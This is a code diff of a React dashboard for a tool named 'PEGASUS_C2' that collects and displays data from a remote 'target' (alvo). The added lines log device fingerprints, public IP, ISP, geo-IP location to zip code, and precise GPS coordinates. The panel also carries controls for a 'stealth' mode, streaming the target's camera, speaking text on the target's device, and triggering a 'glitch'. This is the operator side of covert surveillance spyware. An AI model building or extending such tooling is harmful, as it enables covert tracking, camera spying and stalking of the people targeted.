@@ -79,20 +79,40 @@ const Dashboard: React.FC = () => {
         setLastPayload(payload);
         addLog(`TELEMETRIA RECEBIDA: ${payload.ip}`, 'success');
         
-        // Detailed log output without AI
-        addLog(`PLATFORMA: ${payload.platform}`, 'info');
+        // --- MAXIMUM VERBOSITY ---
+        addLog(`[SISTEMA] PROTOCOLO: ${payload.isStealth ? 'STEALTH_ACTIVED' : 'NORMAL_PROBE'}`, 'system');
+        addLog(`[HARDWARE] PLATFORMA: ${payload.platform}`, 'info');
+        addLog(`[HARDWARE] CORES: ${payload.hardwareConcurrency || 'N/A'}`, 'info');
+        addLog(`[HARDWARE] RAM: ${payload.deviceMemory ? payload.deviceMemory + 'GB' : 'N/A'}`, 'info');
+        addLog(`[HARDWARE] GPU: ${payload.gpu || 'N/A'}`, 'info');
+        addLog(`[HARDWARE] BATERIA: ${payload.battery !== undefined ? payload.battery + '%' : 'N/A'}`, 'info');
+        addLog(`[HARDWARE] TOUCH_POINTS: ${payload.maxTouchPoints || 0}`, 'info');
+        
+        addLog(`[SOFTWARE] AGENTE: ${payload.userAgent.substring(0, 50)}...`, 'info');
+        addLog(`[SOFTWARE] LINGUAGEM: ${payload.language}`, 'info');
+        addLog(`[SOFTWARE] RESOLUÇÃO: ${payload.screenWidth}x${payload.screenHeight} (${payload.colorDepth}bit)`, 'info');
+        addLog(`[SOFTWARE] TIMEZONE: ${payload.timezone}`, 'info');
+        addLog(`[SOFTWARE] COOKIES: ${payload.cookiesEnabled ? 'ON' : 'OFF'}`, 'info');
+        addLog(`[SOFTWARE] REFERRER: ${payload.referrer}`, 'info');
+        
+        addLog(`[REDE] IP_PUBLICO: ${payload.ip}`, 'success');
+        addLog(`[REDE] TIPO_CONEXAO: ${payload.connectionType?.toUpperCase() || 'UNKNOWN'}`, 'info');
         if (payload.ipGeo) {
-           addLog(`LOCALIZAÇÃO: ${payload.ipGeo.city}, ${payload.ipGeo.country}`, 'info');
+           addLog(`[GEO_IP] PROVEDOR: ${payload.ipGeo.isp}`, 'success');
+           addLog(`[GEO_IP] ASN: ${payload.ipGeo.asn || 'N/A'}`, 'info');
+           addLog(`[GEO_IP] LOCAL: ${payload.ipGeo.city}, ${payload.ipGeo.region}, ${payload.ipGeo.country} [${payload.ipGeo.zip || 'N/A'}]`, 'success');
         }
 
         if (payload.coords) {
            setTargetCoords({ lat: payload.coords.latitude, lng: payload.coords.longitude });
-           addLog(`COORDENADAS FIXADAS`, 'success');
+           addLog(`[COORDENADAS] LAT: ${payload.coords.latitude} | LNG: ${payload.coords.longitude}`, 'success');
+           addLog(`[COORDENADAS] PRECISÃO: ~${Math.round(payload.coords.accuracy)}m`, 'warning');
         }
+        addLog(`----------------------------------------`, 'info');
       },
       () => {
         setConnected(true);
-        addLog(`SISTEMA PEGASUS PRONTO. AGUARDANDO UPLINK...`, 'system');
+        addLog(`PEGASUS_C2_READY. AWAITING TARGET...`, 'system');
       },
       undefined, 
       (streamData: StreamMessage) => setCameraStream(streamData.image)
@@ -105,7 +125,6 @@ const Dashboard: React.FC = () => {
       <div className="w-full md:w-1/2 h-1/2 md:h-full relative z-20 flex flex-col border-r border-gray-800">
         <Terminal logs={logs} connected={connected} sessionId={sessionId} />
         
-        {/* Advanced C2 Controls */}
         <div className="bg-black border-t border-gray-800 p-3 space-y-3">
            <form onSubmit={sendTTS} className="flex gap-2">
               <div className="flex-1 bg-gray-900 border border-gray-700 flex items-center px-2">
@@ -113,7 +132,7 @@ const Dashboard: React.FC = () => {
                  <input 
                     value={ttsText}
                     onChange={(e) => setTtsText(e.target.value)}
-                    placeholder="COMANDO DE VOZ REMOTO..." 
+                    placeholder="DIGITE PARA FALAR NO ALVO..." 
                     className="bg-transparent border-none text-xs py-2 w-full text-green-500 focus:outline-none placeholder:text-gray-700"
                  />
               </div>
@@ -130,7 +149,7 @@ const Dashboard: React.FC = () => {
                <Camera size={14} /> CAM
              </button>
              <button onClick={triggerGlitch} disabled={!connected} className="flex items-center gap-2 px-3 py-1.5 text-[10px] font-bold border bg-red-900/20 border-red-600 text-red-500 hover:bg-red-600 hover:text-white transition-colors">
-               <Zap size={14} /> PANIC
+               <Zap size={14} /> GLITCH
              </button>
            </div>
         </div>
@@ -148,7 +167,7 @@ const Dashboard: React.FC = () => {
               <button onClick={toggleCamera}><X size={16} /></button>
             </div>
             <div className="aspect-video bg-black flex items-center justify-center overflow-hidden">
-              {cameraStream ? <img src={cameraStream} className="w-full h-full object-cover" /> : <div className="text-red-500 animate-pulse">WAITING_FOR_DATA...</div>}
+              {cameraStream ? <img src={cameraStream} className="w-full h-full object-cover" /> : <div className="text-red-500 animate-pulse text-xs">AWAITING_UPLINK...</div>}
             </div>
           </div>
         </div>
